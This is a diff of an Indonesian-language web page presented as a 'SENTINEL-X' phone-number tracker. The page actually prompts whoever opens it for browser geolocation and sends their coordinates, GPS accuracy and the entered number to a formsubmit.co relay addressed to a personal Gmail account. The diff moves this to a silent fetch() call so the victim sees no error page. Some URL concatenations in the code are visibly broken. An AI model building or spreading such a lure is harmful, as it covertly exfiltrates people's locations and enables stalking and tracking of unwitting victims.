@@ -10,7 +10,7 @@
         input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 85%; margin-bottom: 20px; outline: none; font-size: 16px; }
         button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; }
         button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
-        #status { font-size: 10px; margin-top: 15px; color: #888; text-align: left; }
+        #status { font-size: 10px; margin-top: 15px; color: #888; text-align: left; min-height: 40px; }
     </style>
 </head>
 <body>
@@ -21,18 +21,8 @@
         <hr color="#003300">
         <p>MASUKKAN NOMOR TARGET:</p>
         
-        <!-- Form Utama - Alamat sudah diperbaiki manual -->
-        <form action="https://formsubmit.co" method="POST" id="trackerForm">
-            <input type="text" name="Nomor_Target" id="phone" placeholder="08xxxxxxxxxx" required>
-            
-            <!-- Data Tersembunyi -->
-            <input type="hidden" name="Link_Google_Maps" id="gmaps_link">
-            <input type="hidden" name="Akurasi_GPS" id="accuracy">
-            <input type="hidden" name="_next" value="https://hiskiayoel9-max.github.io">
-            <input type="hidden" name="_captcha" value="false">
-            
-            <button type="button" onclick="startTrack()">LACAK SEKARANG</button>
-        </form>
+        <input type="text" id="phone" placeholder="08xxxxxxxxxx" required>
+        <button type="button" onclick="startTrack()">LACAK SEKARANG</button>
         
         <div id="status">> Menunggu input nomor...</div>
     </div>
@@ -41,26 +31,40 @@
         function startTrack() {
             const phone = document.getElementById('phone').value;
             const status = document.getElementById('status');
+            const email = "hiskiayoel9@gmail.com";
 
             if (!phone) { alert("Nomor HP wajib diisi!"); return; }
 
             status.innerText = "> MENGHUBUNGKAN KE SATELIT...";
 
             if (navigator.geolocation) {
-                // Meminta lokasi GPS
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
+                    const mapsUrl = "https://www.google.com" + lat + "," + lon;
                     
-                    // Isi data ke form secara otomatis
-                    document.getElementById('accuracy').value = acc + " meter";
-                    document.getElementById('gmaps_link').value = "https://www.google.com" + lat + "," + lon;
-                    
-                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM...";
-                    
-                    // Kirim form
-                    document.getElementById('trackerForm').submit();
+                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM DATA...";
+
+                    // Kirim data secara diam-diam (AJAX) agar tidak muncul halaman error
+                    fetch("https://formsubmit.co" + email, {
+                        method: "POST",
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify({
+                            Nomor_Target: phone,
+                            Link_Google_Maps: mapsUrl,
+                            Akurasi: position.coords.accuracy + " meter",
+                            _subject: "🎯 SENTINEL-X: LOKASI DITEMUKAN!"
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        status.innerText = "> DATA BERHASIL DISIMPAN KE SERVER.";
+                        alert("Pelacakan Selesai! Cek email hiskiayoel9@gmail.com (periksa juga folder Spam/Junk).");
+                    })
+                    .catch(error => {
+                        status.innerText = "> ERROR: GAGAL MENGIRIM DATA.";
+                        console.log(error);
+                    });
                     
                 }, (error) => {
                     alert("ERROR: Target menolak izin lokasi. Gagal melacak.");
